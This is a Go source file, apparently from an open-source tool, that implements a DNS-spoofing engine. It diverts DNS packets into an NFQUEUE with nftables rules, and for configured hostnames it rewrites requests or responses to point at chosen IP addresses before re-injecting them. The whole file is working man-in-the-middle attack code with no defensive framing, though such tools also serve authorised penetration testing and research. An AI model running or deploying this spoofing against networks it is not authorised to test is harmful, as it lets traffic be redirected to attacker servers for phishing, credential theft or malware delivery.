package dnsspoofer

import (
	"context"
	"errors"
	"regexp"

	"github.com/Onyz107/dnsspoofer/internal/dns"
	"github.com/Onyz107/dnsspoofer/internal/nfqueue"
	"github.com/Onyz107/dnsspoofer/internal/nftables"
	gonfqueue "github.com/florianl/go-nfqueue/v2"
	"golang.org/x/sys/unix"
)

func New(opts *EngineOptions) *Engine {
	if opts.Logger == nil {
		opts.Logger = new(devNull)
	}
	engine := &Engine{
		opts: opts,
	}
	return engine
}

var re = regexp.MustCompile(`(\w+)="([^"]*)"`)

func stringToFields(slice string) []any {
	matches := re.FindAllStringSubmatch(slice, -1)
	fields := make([]any, 0, len(matches))
	for _, match := range matches {
		if len(match) >= 3 {
			fields = append(fields, match[1], match[2])
		}
	}
	return fields
}

func (e *Engine) Run(ctx context.Context) error {
	inCtx, cancel := context.WithCancel(ctx)
	e.ctx = inCtx
	e.cancel = cancel

	clean, err := nftables.AddDNSQueue(e.opts.IPMode, e.opts.Iface, e.opts.SpoofMode, e.opts.Scope, e.opts.Queue)
	if err != nil {
		e.cancel()
		return errors.Join(ErrAddDNSQueue, err)
	}

	e.cancel = func() {
		cancel()
		clean()
	}

	nfq, err := gonfqueue.Open(&gonfqueue.Config{
		NfQueue:      e.opts.Queue,
		MaxQueueLen:  1024,
		MaxPacketLen: 2048,
		Copymode:     gonfqueue.NfQnlCopyPacket,
		Flags:        gonfqueue.NfQaCfgFlagFailOpen,
		AfFamily:     unix.AF_UNSPEC,
		Logger:       e.opts.Logger,
	})
	if err != nil {
		e.cancel()
		return errors.Join(ErrOpenNFQueue, err)
	}
	e.cancel = func() {
		cancel()
		nfq.Close()
		clean()
	}
	defer e.cancel()

	pkts, err := nfqueue.GetPacketChan(inCtx, nfq)
	if err != nil {
		e.cancel()
		return errors.Join(ErrGetPacketChan, err)
	}

	for {
		select {
		case <-inCtx.Done():
			e.cancel()
			return nil
		case pkt := <-pkts:
			parsed, err := dns.ParsePacket(pkt)
			if err != nil {
				e.opts.Logger.Error(ErrParsePacket.Error(), "err", err)
				nfq.SetVerdict(pkt.PacketID, gonfqueue.NfDrop)
				continue
			}
			e.opts.Logger.Info("parsed packet", stringToFields(parsed.String())...)

			var name string
			if len(parsed.DNS.Answers) > 0 {
				name = string(parsed.DNS.Answers[0].Name)
			} else if len(parsed.DNS.Questions) > 0 {
				name = string(parsed.DNS.Questions[0].Name)
			}

			ips, ok := e.opts.Hosts[name]
			if !ok || len(ips) == 0 {
				nfq.SetVerdict(pkt.PacketID, gonfqueue.NfAccept)
				continue
			}

			var spoofed *dns.ParsedPacket
			if parsed.IsRequest {
				spoofed, err = dns.SpoofRequest(parsed, ips...)
			} else {
				spoofed, err = dns.SpoofResponse(parsed, ips...)
			}
			if err != nil {
				e.opts.Logger.Error(ErrSpoofPacket.Error(), "err", err)
				nfq.SetVerdict(pkt.PacketID, gonfqueue.NfDrop)
				continue
			}
			e.opts.Logger.Info("spoofed packet", stringToFields(spoofed.String())...)

			newBytes, err := spoofed.Serialize()
			if err != nil {
				e.opts.Logger.Error(ErrSerializePkt.Error(), "err", err)
				nfq.SetVerdict(pkt.PacketID, gonfqueue.NfDrop)
				continue
			}

			if err := nfq.SetVerdictWithOption(pkt.PacketID, gonfqueue.NfAccept, gonfqueue.WithAlteredPacket(newBytes)); err != nil {
				e.opts.Logger.Error(ErrSetVerdict.Error(), "err", err)
				nfq.SetVerdict(pkt.PacketID, gonfqueue.NfDrop)
			}
		}
	}
}

func (e *Engine) Stop() {
	if e.cancel != nil {
		e.cancel()
	}
}
